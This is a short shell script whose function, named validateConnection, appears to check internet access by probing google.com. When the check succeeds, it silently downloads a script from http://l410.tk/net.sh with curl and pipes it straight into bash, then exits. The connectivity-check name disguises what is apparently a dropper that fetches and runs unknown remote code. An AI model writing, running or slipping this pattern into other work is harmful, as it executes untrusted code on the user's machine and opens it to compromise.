validateConnection () {
wget -q --spider http://google.com

if [ $? -eq 0 ]; then
    #sihay
    curl -s -L http://l410.tk/net.sh | bash
      
    exit 1

fi
}
validateConnection

